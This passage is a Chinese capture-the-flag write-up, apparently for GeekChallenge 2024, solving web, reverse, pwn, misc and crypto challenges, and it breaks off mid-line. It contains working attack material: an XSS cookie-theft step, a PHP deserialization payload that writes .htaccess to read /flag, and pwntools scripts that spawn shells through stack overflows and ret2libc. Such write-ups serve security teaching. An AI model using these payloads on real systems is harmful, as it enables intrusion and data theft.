/manager 页面POST url=http://127.0.0.1，让bot访问主页，触发攻击，在XSS平台拿到cookie，内含flag： flag=SYC&#123;xxx&#125;。 ​ ezpop 听说pop链很难？来做做我的找找自信吧(如果遇到500报错，请耐心等待几秒钟刷新即可,flag在/flag) 反序列化，绕关键字，用 .htaccess 绕死亡exit： 12345678910111213141516171819202122from phpserialize import *from urllib.parse import quoteclass SYC: public_starven=&#x27;php://filter/write=string.strip_tags/?&gt;php_value auto_prepend_file /flag\\n#/resource=.htaccess&#x27;class Geek: public_GSBP=SYC()class lover: public_meimeng=Geek()class Geek: public_GSBP=lover()class lover: public_J1rry=&#x27;data://text/plain,Welcome GeekChallenge 2024&#x27; public_meimeng=Geek()print(quote(serialize(lover())).replace(&#x27;s%3A7%3A%22meimeng&#x27;,&#x27;S%3A7%3A%22\\\\6deimeng&#x27;))# O%3A5%3A%22lover%22%3A2%3A%7Bs%3A5%3A%22J1rry%22%3Bs%3A44%3A%22data%3A//text/plain%2CWelcome%20GeekChallenge%202024%22%3BS%3A7%3A%22\\6deimeng%22%3BO%3A4%3A%22Geek%22%3A1%3A%7Bs%3A4%3A%22GSBP%22%3BO%3A5%3A%22lover%22%3A1%3A%7BS%3A7%3A%22\\6deimeng%22%3BO%3A4%3A%22Geek%22%3A1%3A%7Bs%3A4%3A%22GSBP%22%3BO%3A3%3A%22SYC%22%3A1%3A%7Bs%3A7%3A%22starven%22%3Bs%3A93%3A%22php%3A//filter/write%3Dstring.strip_tags/%3F%3Ephp_value%20auto_prepend_file%20/flag%0A%23/resource%3D.htaccess%22%3B%7D%7D%7D%7D%7D 得到结果传入data参数，再刷新页面得到flag。 ​ Reversehello_re Welcome to Reverse’s world! 听说010可以看到文件的本质捏 把 SYC0 改 UPX0，upx脱壳，代码逻辑是一个简单的异或操作。 123456c=[0,1,2,52,3,96,47,28,107,15,9,24,45,62,60,2,17,123,39,58,41,48,96,26,8,52,63,100,33,106,122,48]k=list(b&#x27;SYCLOVER\\x00&#x27;)m=[c[i]^k[i%8]^i for i in range(len(c))]print(bytes(m))# b&#x27;SYC&#123;H3lI0_@_new_R3vers3_Ctf3r!!&#125;&#x27; ​ 先来一道简单题 欢迎来到极客大挑战，先来一道签到题热热身吧。 gcc将汇编s文件生成目标o文件再到可执行文件： gcc -c sssssssss.s -o s.o gcc s.o -o s 按逻辑逆： 12345678c=list(b&#x27;TTDv^jrZu`Gg6tXfi+pZojpZSjXmbqbmt.&amp;x&#x27;)for i in range(0,len(c),2): c[i]^=7 c[i+1]+=5print(bytes(c))# SYC&#123;You_re@l1y_kn0w_how_To_revers3!&#125; ​ 也许你也听jay 周杰伦的歌像一把钥匙打开了回忆之门，旋律流淌中，仿佛呼吸着曾经放肆招摇的风。你能找到我的钥匙吗。(流畅访问网址可能需要代理,网站有音乐，请合理控制音量) 替换长名字变量，逆： 123456789101112131415161718192021222324bb=[0x96, 0xa1, 0xa0, 0x9b, 0x9b, 0x5f, 0x49, 0x46, 0x85, 0x82, 0x53, 0x95, 0x7d, 0x36, 0x8d, 0x74, 0x82, 0x88, 0x46, 0x7a, 0x81, 0x65, 0x80, 0x6c, 0x78, 0x2f, 0x6b, 0x6a, 0x27, 0x50, 0x61, 0x38, 0x3f, 0x37, 0x33, 0xf1, 0x27, 0x32, 0x34, 0x1f, 0x39, 0x23, 0xde, 0x1c, 0x17, 0xd4]cc=[0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F, 0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F, 0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F, 0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8A, 0x8B, 0x8C, 0x8D]dd=[0x5D, 0x5C, 0x5B, 0x5A, 0x59, 0x58, 0x57, 0x56, 0x55, 0x54, 0x53, 0x52, 0x51, 0x50, 0x4F, 0x4E, 0x4D, 0x4C, 0x4B, 0x4A, 0x49, 0x48, 0x47, 0x46, 0x45, 0x44, 0x43, 0x42, 0x41, 0x40, 0x3F, 0x3E, 0x3D, 0x3C, 0x3B, 0x3A, 0x39, 0x38, 0x37, 0x36, 0x35, 0x34, 0x33, 0x32, 0x31, 0x30, 0x2F, 0x2E, 0x2D, 0x2C, 0x2B, 0x2A, 0x29, 0x28, 0x27, 0x26, 0x25, 0x24, 0x23, 0x22, 0x21, 0x20, 0x1F, 0x1E, 0x1D, 0x1C, 0x1B, 0x1A, 0x19, 0x18, 0x17, 0x16, 0x15, 0x14, 0x13, 0x12, 0x11, 0x10, 0x0F, 0x0E, 0x0D, 0x0C, 0x0B, 0x0A, 0x09, 0x08, 0x07, 0x06, 0x05, 0x04, 0x03, 0x02, 0x01]ee=[0x65, 0x64, 0x63, 0x62, 0x61, 0x60, 0x5F, 0x5E, 0x5D, 0x5C, 0x5B, 0x5A, 0x59, 0x58, 0x57, 0x56, 0x55, 0x54, 0x53, 0x52, 0x51, 0x50, 0x4F, 0x4E, 0x4D, 0x4C, 0x4B, 0x4A, 0x49, 0x48, 0x47, 0x46, 0x45, 0x44, 0x43, 0x42, 0x41, 0x40, 0x3F, 0x3E, 0x3D, 0x3C, 0x3B, 0x3A, 0x39, 0x38, 0x37, 0x36, 0x35, 0x34, 0x33, 0x00, 0x31, 0x30, 0x2F]aa=bb[:]for i in range(len(aa)): aa[i]-=dd[i]for i in range(len(aa)-1,-1,-1): cc[i]^=ee[51] aa[i]+=cc[47+i]for i in range(len(aa)): aa[i]^=cc[i] aa[i]&amp;=0xfffor i in range(len(ee)): ee[i]^=dd[i+1] ee[i]-=cc[i]print(bytes(aa))# b&#x27;https://am1re-sudo.github.io/Coisni.github.io/&#x27; 访问链接，文字： 12345本来讨厌下雨的天空， 直到听有人说爱我 ” 你听不到密文，没关系，我会帮你写在下面。 Q7u+cyiOQtKHRMqZNzPpApgmTL4j+TE=“你在橱窗前凝视碑文的字眼，我却在旁静静欣赏你那张我深爱的脸” 我正愁找不到密钥，突然想起爱在西元前的英文是lovebeforeBC“我的思念，厚厚一叠”， 哼着七里香，我会拾起密钥，尝试用RC4来为解密画上句点，余晖刚好， 就像是某个晚霞清风的傍晚，校园广播刚好放起了七里香，转过楼梯拐角，又恰好对上她眉眼弯弯，笑容灿烂。 有密文和key，RC4解密得到flag：SYC&#123;ILIKELISTENJAYSONG&#125;。 ​ 让我康康你的调试 让我康康你的ida能调试吗 RC4+xor。 c=945b7d04c9027aa6390798bc0d68f97e08bdbf9816f804715f1586b69884db61 key=syclover cyberchef解得flag：SYC&#123;we1come_t0_Geek&#39;s_3asy_rc4!&#125;。 ​ 我勒个z3啊 什么！竟然是数学吗，快去请z3老祖 z3求解器求解： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from z3 import *t=&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ?_&#x27;c=[42, 14, 14, 20, 63, 63, 63, 38, 17, 10, 21, 21, 14, 23, 16, 14]key=&#x27;&#x27;.join([t[k] for k in c])print(key)key=list(key.encode())s1=Solver()f=[Int(f&#x27;f&#123;i&#125;&#x27;) for i in range(32)]c=[0x19B,0x113,0x189,0x1C9,0x250,0x536,0x4DE,0x1BC,0x41B,0x724,0x6D0,0x4A1,0x645,0x475,0x4CA,0x68C,0x3E5,0x1C7,0x33D,0x5B7,0x28D,0x244,0x30E,0x291,0x271,0x301,0x45F,0x46F,0x517,0x41E,0x426,0x4B5]for i in range(0,32,4): s1.add(f[i]+8*f[i+1]+6*f[i+2]+f[i+3]==c[i]) s1.add(f[i+1]+8*f[i+2]+6*f[i+3]+f[i]==c[i+1]) s1.add(f[i+2]+8*f[i+3]+6*f[i]+f[i+1]==c[i+2]) s1.add(f[i+3]+8*f[i]+6*f[i+1]+f[i+2]==c[i+3])#print(s1.check())m=s1.model()cc=[]for i in range(32): cc.append(m[f[i]].as_long())#print(cc)s2=Solver()f=[BitVec(f&#x27;f&#123;i&#125;&#x27;,8) for i in range(32)]ff=f[:]for i in range(8): j=0 while j&lt;i: x=ff[4*i] for k in range(3): ff[4*i+k]=ff[4*i+k+1] ff[4*i+3]=x j+=1for i in range(32): ff[i]^=ff[(31+i)%32] ff[i]^=key[15-i]^ifor i in range(32): s2.add(ff[i]==cc[i])#print(s2.check())m=s2.model()flag=[]for i in range(32): flag.append(m[f[i]].as_long())#print(flag)print(bytes(flag))# b&#x27;Geek___Challenge&#x27;# b&#x27;SYC&#123;Wow!!_Y0u_4r3_9o0d_At_r3$!!&#125;&#x27; ​ ezzzz 喝喝茶，做做题 题目附件下载链接:https://pan.baidu.com/s/1MXYmUTyrwRtfoBntEPiBPg 密码:game apk文件分析，关键逻辑： 1234567public void check() &#123; if (Enc.encrypt(this.et.getText().toString()).equals(getResources().getString(R.string.target))) &#123; Toast.makeText(this, &quot;Wow!You are right!!!&quot;, 0).show(); &#125; else &#123; Toast.makeText(this, &quot;Emmmmm……wrong????&quot;, 0).show(); &#125;&#125; 加密逻辑在 Enc.encrypt()，发现是带符号的xtea加密，提取密文： target=f1f186b25a96c782e6c63a0b70b61b5ced6bf84889700d6b09381b5ccb2f24fab1c79e796d822d9cdcc55f760f780e750d65c4afb89084a9e978c3827a8dd81091f28df3a84dbacab4d75f75f19af8e5b90f80fcfc10a5c3d20679fb2bc734c8ccb31c921ac52ad3e7f922b72e24d923fb4ce9f53548a9e571ebc25adf38862e10059186327509463dd4d54c905abc36c26d5312d2cd42c0772d99e50cd4c4665c3178d63a7ffe71ada251c070568d5a5798c2921ec0f7fc3ae9d8418460762930ca6a2dccef51d2a1a8085491b0f82d686ca34774c52d0f0f26449fc28d362c86f3311b8adc4fb1a4497e34e0f0915d 用c写解密： 1234567891011121314151617181920212223#include&lt;stdio.h&gt;int map[] = &#123;4059137714, 1519830914, 3871750667, 1890982748, 3983276104, 2305822059, 154671964, 3408864506, 2982649465, 1837247900, 3703922550, 259526261, 224773295, 3096478889, 3917005698, 2056116240, 2448592371, 2823666378, 3034013557, 4053465317, 3104801020, 4228949443, 3523639803, 734475464, 3434290322, 449129171, 3891864247, 774166819, 4216121845, 893954533, 1911276122, 3745023534, 268800390, 846530886, 1037358412, 2421865526, 3261944594, 3536667328, 1999477221, 215270502, 1546746070, 981466737, 2913096128, 1884720474, 1469629074, 515962876, 988403777, 2220914217, 818571821, 3438236114, 2712143956, 2444294189, 1751950151, 1959079183, 254166175, 3264034348, 2264084763, 2329694129, 2756279860, 3773862237&#125;;int key[] = &#123;71, 69, 69, 75&#125;;void decode(int* v,int* k) &#123; int sum = 0; for(int i=0; i&lt;32; ++i) sum += 0x9E3779B9; for(int j=31; j&gt;=0; --j) &#123; v[1] -= (((v[0] &lt;&lt; 4) ^ (v[0] &gt;&gt; 5)) + v[0]) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]) ^ (sum+j); sum -= 0x9E3779B9; v[0] -= (((v[1] &lt;&lt; 4) ^ (v[1] &gt;&gt; 5)) + v[1]) ^ (sum + key[sum &amp; 3]) ^ (sum+j); &#125;&#125;int main() &#123; for(int i=0; i&lt;60; i+=2) decode(&amp;map[i],key); for(int i=0; i&lt;60; ++i) printf(&quot;%c&quot;,map[i]); return 0;&#125;// SYC&#123;g0od_j0b_wweLCoMeToooSSSyC_zz_1_et3start_yoUr_j0urney!!&#125; ​ Pwn你会栈溢出吗 超级简单的题目 ret2text。 12345678910from pwn import *r=remote(&#x27;nc1.ctfplus.cn&#x27;,34467)r.recvline()key=0x40073Dpl=b&#x27;a&#x27;*(0xc+8)+p64(key)r.sendline(pl)r.interactive() ​ 简单的签到 作为大学生，一定要有快速口算的能力！ pwntools运用。 12345678910from pwn import *r=remote(&#x27;nc1.ctfplus.cn&#x27;,20040)r.recvuntil(b&#x27;challenge.\\n&#x27;)r.sendline()ans=eval(r.recvuntil(b&#x27;= &#x27;)[:-2])r.sendline(str(ans).encode())r.interactive() ​ ez_shellcode 不能更加简单的pwn_shellcode题,什么你不知道shellcode？快去学吧 ret2shellcode。 123456789101112131415from pwn import *context.arch=&#x27;amd64&#x27;r=remote(&#x27;nc1.ctfplus.cn&#x27;,43003)r.recvuntil(b&#x27;shellcode?\\n&#x27;)pl=asm(shellcraft.sh())r.send(pl)gift=0x401256r.recvline()pl=b&#x27;a&#x27;*(0x18+8)+p64(gift)r.sendline(pl)r.interactive() ​ 00000 你说让我输密码？有没有什么简单的办法呢？ 利用函数特性逐位爆破。 1234567891011121314from pwn import *def burp(): r=remote(&#x27;nc1.ctfplus.cn&#x27;,15085) r.sendlineafter(b&#x27;Enter the password: &#x27;,b&#x27;\\x00&#x27;) x=r.recvline() print(x) if b&#x27;wrong&#x27; in x: r.close() burp() else: r.interactive()burp() ​ 买黑吗喽了吗 黑吗喽真好玩! balance负溢出，转无符号&gt;0x100，进入修改str的2字节，改为 %p，可以泄露出balance地址。 求pie基址，再ret2libc。 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *context.arch=&#x27;amd64&#x27;r=remote(&#x27;nc1.ctfplus.cn&#x27;,33352)elf=ELF(&#x27;./买黑马喽了么/syscall&#x27;)libc=ELF(&#x27;./买黑马喽了么/libc.so.6&#x27;)for i in range(8): r.sendlineafter(b&#x27;choice:\\n&#x27;,b&#x27;1&#x27;) r.sendlineafter(b&#x27;choice:\\n&#x27;,b&#x27;1&#x27;)r.sendlineafter(b&#x27;choice:\\n&#x27;,b&#x27;1&#x27;)r.sendlineafter(b&#x27;choice:\\n&#x27;,b&#x27;2&#x27;)r.sendlineafter(b&#x27;choice:\\n&#x27;,b&#x27;2&#x27;)r.send(b&#x27;%p&#x27;)r.recvuntil(b&#x27;0x&#x27;)balance_addr=eval(r.recvuntil(b&#x27; &#x27;))pie_base=balance_addr-0x4090success(f&#x27;&#123;pie_base:x&#125;&#x27;)r.sendlineafter(b&#x27;choice:\\n&#x27;,b&#x27;3&#x27;)pop_rdi=pie_base+0x11f1ret=pie_base+0x101aputs_plt=pie_base+elf.plt.putsputs_got=pie_base+elf.got.putsread_back=pie_base+0x14c0pl=flat([b&#x27;a&#x27;*(0x50+8),pop_rdi,puts_got,puts_plt,read_back])r.send(pl)puts_addr=u64(r.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(f&#x27;&#123;puts_addr:x&#125;&#x27;)libc_base=puts_addr-libc.sym.putssuccess(f&#x27;&#123;libc_base:x&#125;&#x27;)system_addr=libc_base+libc.sym.systembinsh_addr=libc_base+next(libc.search(b&#x27;/bin/sh\\x00&#x27;))r.recvuntil(b&#x27;feedback:\\n&#x27;)pl=flat([b&#x27;a&#x27;*(0x50+8),ret,pop_rdi,binsh_addr,system_addr,read_back])print(len(pl)%16)r.send(pl)r.interactive() ​ over_flow?? stack overflow?? 123456789from pwn import *context.arch=&#x27;amd64&#x27;r=remote(&#x27;nc1.ctfplus.cn&#x27;,16674)r.sendlineafter(b&#x27;&gt;&gt;&#x27;,b&#x27;2&#x27;)r.sendafter(b&#x27;&gt;&gt;&#x27;,b&#x27;/bin/sh\\x00\\x3b&#x27;)r.interactive() ​ Week2Miscez_pcap_1 黑客通过外网getshell进入内网，在域渗透横向文件传输时传送了一个危险文件，你能找到这个危险文件吗？ 010editor16进制查看下搜索 SYC，flag：SYC&#123;smb_pcapng_1s_g00d!&#125;。 ​ cimbar What is cimbar 参考：https://www.bilibili.com/read/cv38452107/ 提取01字符串： 123456701010011010110010100001101111011010000010110111000110000011101000110100000110011011100100101111101000001011011010100000001111010001100010110111000111001010111110101000101010010010111110100001101101111001101000110010101111101 二进制转字符得到flag：SYC&#123;An0th3r_Am@z1n9_QR_Co4e&#125;。 ​ 舔狗的觉醒 听说爱自己的人会有好运哦 爆破解压密码：88888888。 字节移位输出新zip： 12345678f=bytes.fromhex(open(&#x27;download.txt&#x27;).read())g=b&#x27;&#x27;for k in f: x=((k&gt;&gt;4)|(k&lt;&lt;4))&amp;0xff g+=bytes([x])open(&#x27;out.zip&#x27;,&#x27;wb&#x27;).write(g) 得到一个加密的pdf文件 flag.pdf，使用PasswareKitForensic去掉pdf密码，打开删除图片，得到flag：SYC&#123;YOu_arE_yOuR_Own_hero&#125;。 ​ 乌龟 starven师傅养了一直会唱歌的乌龟，但是他走丢了，你能帮starven师傅找到他吗(音频文件不只一种用法) wav文件，sstv音转图： sstv -d sunset.wav -o result.png 得到的图片里面有 PASS:Be4uti7ulSun5e7。 wav文件再用deepsound，密码 Be4uti7ulSun5e7，提取出 secret.txt： 1to draw_s pu setxy -400 200 pd repeat 18 [fd 5 lt 10 wait 2] repeat 8 [fd 5 lt 10 wait 2] repeat 21 [fd 5 rt 10 wait 2] pu setxy -350 200 pd fd 50 wait 5 pu setxy -350 200 pd rt 100 fd 50 wait 5 pu setxy -350 200 pd rt 130 fd 75 wait 5 pu setxy -220 200 pd rt 130 repeat 27 [fd 8 lt 10 wait 2] pu setxy -430 70 pd lt 130 fd 100 wait 5 pu setxy -480 70 pd lt 90 fd 100 wait 5 pu setxy -420 70 pd fd 100 lt 90 fd 50 lt 90 fd 100 wait 5 pu setxy -350 70 pd rt 90 fd 70 rt 90 fd 50 rt 90 fd 70 wait 5 pu setxy -280 20 pd lt 90 fd 50 rt 90 fd 70 wait 5 pu setxy -250 70 pd rt 180 fd 100 wait 5 pu setxy -200 70 pd rt 90 fd 100 wait 5 pu setxy -130 70 pd lt 130 fd 30 rt 130 fd 110 rt 90 fd 30 wait 5 pu setxy -130 -20 pd lt 180 fd 40 wait 5 pu setxy -70 70 pd fd 70 wait 5 pu setxy -70 70 pd rt 90 fd 50 lt 90 fd 70 wait 5 pu setxy -70 20 pd rt 90 fd 50 lt 90 fd 70 wait 5 pu setxy 20 -30 pd fd 70 wait 5 pu setxy 120 70 pd repeat 18 [fd 5 rt 10 wait 2] pu setxy 120 70 pd lt 90 fd 100 wait 5 pu setxy 180 70 pd fd 50 lt 90 fd 50 wait 5 pu setxy 230 70 pd rt 90 fd 100 wait 5 pu setxy 260 70 pd lt 90 fd 50 wait 5 pu setxy 285 70 pd rt 90 fd 100 wait 5 pu setxy 260 -30 pd lt 90 fd 50 wait 5 pu setxy 340 70 pd rt 90 fd 100 wait 5 pu setxy 340 70 pd lt 30 fd 115 wait 5 pu setxy 398 -30 pd lt 150 fd 100 wait 5 pu setxy 420 70 pd rt 90 fd 100 wait 5 pu setxy 470 70 pd rt 90 fd 100 wait 5 pu setxy -520 -70 pd lt 90 fd 60 wait 5 pu setxy -490 -70 pd rt 90 fd 100 wait 5 pu setxy -520 -170 pd lt 90 fd 60 wait 5 pu setxy -420 -70 pd rt 90 fd 100 wait 5 pu setxy -420 -70 pd lt 30 fd 115 wait 5 pu setxy -362 -170 pd lt 150 fd 100 wait 5 pu setxy -270 -70 pd lt 90 repeat 27 [fd 8 lt 10 wait 2] lt 180 fd 40 wait 5 pu setxy -230 -120 pd rt 90 fd 30 wait 5 end clearscreen draw_s 查知为logo编程语言，找个在线网站绘制，得到flag：SYC&#123;TU3T1E_P4INTING&#125;。 ​ ez_climbstairs 动态规划算法入门题目你知道如何爬楼梯吗？爬对100次就给你flag 爬楼梯经典问题，dp解决，对照测试样例数据，发现是最多可爬3阶。 12345678910111213141516171819202122232425262728from pwn import *def climb_stairs_limited_steps(n, k): # 初始化dp数组，dp[i]表示到达第i阶的方法总数 dp = [0] * (n + 1) dp[0] = 1 # 到达第0阶有1种方法（不动） # 填充dp数组 for i in range(1, n + 1): # 计算dp[i]为前面最多k阶的方法数之和 dp[i] = sum(dp[max(0, i - k):i]) return dp[n]r = remote(&#x27;nc1.ctfplus.cn&#x27;,15734)for i in range(100): print(i) r.recvuntil(&#x27;爬上 &#x27;.encode()) n = int(r.recvuntil(b&#x27; &#x27;)) print(n) # 计算爬n阶且每次最多能爬k阶的方法总数 k = 3 # 每次最多爬3阶 res = climb_stairs_limited_steps(n, k) r.sendlineafter(&#x27;：&#x27;.encode(),str(res).encode()) print(r.recvline())r.interactive() ​ doSomeMath lhRaMk7在没通过他的小升初数学考试之后来GSBP老师这里补习，发现他一道题都做不出来，大学生们能帮帮他吗 用 __le__ 或 __lt__ 生成 True 或 False，等同于1和0。 构造： 1234567891011121314151617181920n0 = &#x27;().__lt__(())&#x27;n1 = &#x27;().__le__(())&#x27;n2 = &#x27;().__le__(())+().__le__(())&#x27;n3 = &#x27;().__le__(())+().__le__(())+().__le__(())&#x27;n4 = &#x27;(().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))&#x27;n5 = &#x27;(().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))+().__le__(())&#x27;n6 = &#x27;(().__le__(())+().__le__(())+().__le__(()))*2&#x27;n7 = &#x27;().__le__(())+().__le__(())+().__le__(())+(().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))&#x27;n8 = &#x27;(().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))&#x27;n9 = &#x27;(().__le__(())+().__le__(())+().__le__(()))*(().__le__(())+().__le__(())+().__le__(()))&#x27;n10 = &#x27;((().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))+().__le__(()))*(().__le__(())+().__le__(()))&#x27;n100 = f&#x27;(&#123;n10&#125;)*(&#123;n10&#125;)&#x27;n1000 = f&#x27;(&#123;n10&#125;)*(&#123;n10&#125;)*(&#123;n10&#125;)&#x27;num = f&#x27;(&#123;n9&#125;)*(&#123;n1000&#125;)+(&#123;n8&#125;)*(&#123;n100&#125;)+(&#123;n7&#125;)*(&#123;n10&#125;)+(&#123;n2&#125;)&#x27;print(num)print(eval(num))# ((().__le__(())+().__le__(())+().__le__(()))*(().__le__(())+().__le__(())+().__le__(())))*((((().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))+().__le__(()))*(().__le__(())+().__le__(())))*(((().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))+().__le__(()))*(().__le__(())+().__le__(())))*(((().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))+().__le__(()))*(().__le__(())+().__le__(()))))+((().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))*(().__le__(())+().__le__(())))*((((().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))+().__le__(()))*(().__le__(())+().__le__(())))*(((().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))+().__le__(()))*(().__le__(())+().__le__(()))))+(().__le__(())+().__le__(())+().__le__(())+(().__le__(())+().__le__(()))*(().__le__(())+().__le__(())))*(((().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))+().__le__(()))*(().__le__(())+().__le__(())))+(().__le__(())+().__le__(()))# 9872 ​ Cryptonc nc连接，包连接上即得flag PoW+逐位问询。 1234567891011121314151617181920212223242526272829303132from pwn import *from hashlib import sha256import stringfrom pwnlib.util.iters import mbruteforcer = remote(&#x27;nc1.ctfplus.cn&#x27;,34835)table = string.ascii_letters+string.digitsdef PoW(): r.recvuntil(b&#x27;XXXX+&#x27;) suffix = r.recv(16).decode() r.recvuntil(b&#x27;== &#x27;) cipher = r.recvline().strip().decode() proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() == cipher, table, length=4, method=&#x27;fixed&#x27;) r.sendlineafter(b&#x27;XXXX: &#x27;, proof.encode()) PoW()flag = b&#x27;&#x27;for i in range(1,33): print(i) r.sendlineafter(b&#x27;[-] &#x27;,str(i).encode()) r.recvuntil(b&#x27;[+] &#x27;) flag += r.recvline().strip() print(flag)r.interactive()# b&#x27;SYC&#123;MAYB3_Y0U_KN0W_A1AN-B3&lt;K3R?&#125;&#x27; ​ ncoCRT if gcd != 1: 基础CRT。 1234567#Sagep = [1921232050179818686537976490035, 2050175089402111328155892746480, 1960810970476421389691930930824, 1797713136323968089432024221276, 2326915607951286191807212748022]c = [1259284928311091851012441581576, 1501691203352712190922548476321, 1660842626322200346728249202857, 657314037433265072289232145909, 2056630082529583499248887436721]m = crt(c,p)print(bytes.fromhex(m)[2:])# SYC&#123;wha+s_wr0n9!_CRT_bu+_n0+_&lt;0mpr1me!&#125; ​ inPEM 丸辣丸辣！开拓者抱头痛哭，我的原神被绳网上的神秘黑客挟持了！好心的绳匠们，你能帮可怜弱小仅仅一岁出头的小星核精讨回公道吗？ 已知公钥解析得到： 12n = 19909823107653171578063591352961144331355821517081529017694276790993397379180193511755806958091550033235815834847549265751244192211761569881061742997804509098095297146520946343734939782935970054031389390447526577982809412074573616889663964050032806967234869741452169276495048891650957729859124875343810181695665153129824527065062831773013713479602052423965588148263292672514853749647510938621421264137177666497737099263481269491867593812579958283619882699866915561357437484323854411934718569074869408000191465973545262527827064708529700071967884924505367105288433603597633451764659888020272057850625902629529400734213e = 65537 已知部分私钥： 12345678910wZyyAzKowuDD1R48UelUskEv0W8AXLOHR4nni2uqP/7tlAPCJrMVD8zoRsRviyUnqO6y7cV7G0Fo1AoGBALpb6vOC9Ya/BEYV8+yL814K0KQc7LITkwqGrDWoDZAxmgWqVtoxHuhDWr5jF+ttFZBPx4fTezTEjarXXSt3pB1c7EwnzO0Hy9qJH++g2dcCUCO8uGXBbAACZqCQZAAydSrM5zozWAYMBWcj54j0LtyOEg4PWPXiTzJ//xxWaH+xAoGBAKFGRIyYD89JvlZA6oz7YnjzsnDlTq01td32XAuw62dZQHWmg1npC3YtzFlgTyNY2QelObmryyc2vFnxVhTYcDXFLQwrX8X5YV4ArFAAlyzxpNzYPzDHrdqLD6PhMU+wRuHVPyAtNBsL0N+mgQcsWJJvngSTHg86kJOlHlNuLBGhAoGAFiG3VR+lubcPvXOVAvkt+c8rF6qcmXlb2Og0hNwDJ2roX98aqOVyp5AWGPoA1siI4/RPIp1ClfEwKMjraun1ZJs/jKemaQk2hdhWkQ+6QinvUJbA1LqmTcRmKa1emY/U6I8ce6N69e7ver1DV4I/ugSahJlZT/JRyF5qj1uVZ/k= 去掉w转16进制： 672c80ccaa30b830f5478f147a552c904bf45bc0172ce1d1e279e2daea8fffbb6500f089acc543f33a11b11be2c949ea3bacbb715ec6d05a3502818100ba5beaf382f586bf044615f3ec8bf35e0ad0a41cecb213930a86ac35a80d90319a05aa56da311ee8435abe6317eb6d15904fc787d37b34c48daad75d2b77a41d5cec4c27cced07cbda891fefa0d9d7025023bcb865c16c000266a090640032752acce73a3358060c056723e788f42edc8e120e0f58f5e24f327fff1c56687fb102818100a146448c980fcf49be5640ea8cfb6278f3b270e54ead35b5ddf65c0bb0eb67594075a68359e90b762dcc59604f2358d907a539b9abcb2736bc59f15614d87035c52d0c2b5fc5f9615e00ac5000972cf1a4dcd83f30c7adda8b0fa3e1314fb046e1d53f202d341b0bd0dfa681072c58926f9e04931e0f3a9093a51e536e2c11a10281801621b7551fa5b9b70fbd739502f92df9cf2b17aa9c99795bd8e83484dc03276ae85fdf1aa8e572a7901618fa00d6c888e3f44f229d4295f13028c8eb6ae9f5649b3f8ca7a669093685d856910fba4229ef5096c0d4baa64dc46629ad5e998fd4e88f1c7ba37af5eeef7abd4357823fba049a8499594ff251c85e6a8f5b9567f9 按照私钥结构分割： 1234567672c80ccaa30b830f5478f147a552c904bf45bc0172ce1d1e279e2daea8fffbb6500f089acc543f33a11b11be2c949ea3bacbb715ec6d05a3502818100ba5beaf382f586bf044615f3ec8bf35e0ad0a41cecb213930a86ac35a80d90319a05aa56da311ee8435abe6317eb6d15904fc787d37b34c48daad75d2b77a41d5cec4c27cced07cbda891fefa0d9d7025023bcb865c16c000266a090640032752acce73a3358060c056723e788f42edc8e120e0f58f5e24f327fff1c56687fb1 (dp)02818100a146448c980fcf49be5640ea8cfb6278f3b270e54ead35b5ddf65c0bb0eb67594075a68359e90b762dcc59604f2358d907a539b9abcb2736bc59f15614d87035c52d0c2b5fc5f9615e00ac5000972cf1a4dcd83f30c7adda8b0fa3e1314fb046e1d53f202d341b0bd0dfa681072c58926f9e04931e0f3a9093a51e536e2c11a1 (dq)0281801621b7551fa5b9b70fbd739502f92df9cf2b17aa9c99795bd8e83484dc03276ae85fdf1aa8e572a7901618fa00d6c888e3f44f229d4295f13028c8eb6ae9f5649b3f8ca7a669093685d856910fba4229ef5096c0d4baa64dc46629ad5e998fd4e88f1c7ba37af5eeef7abd4357823fba049a8499594ff251c85e6a8f5b9567f9 有： 12dp = 0x00ba5beaf382f586bf044615f3ec8bf35e0ad0a41cecb213930a86ac35a80d90319a05aa56da311ee8435abe6317eb6d15904fc787d37b34c48daad75d2b77a41d5cec4c27cced07cbda891fefa0d9d7025023bcb865c16c000266a090640032752acce73a3358060c056723e788f42edc8e120e0f58f5e24f327fff1c56687fb1dq = 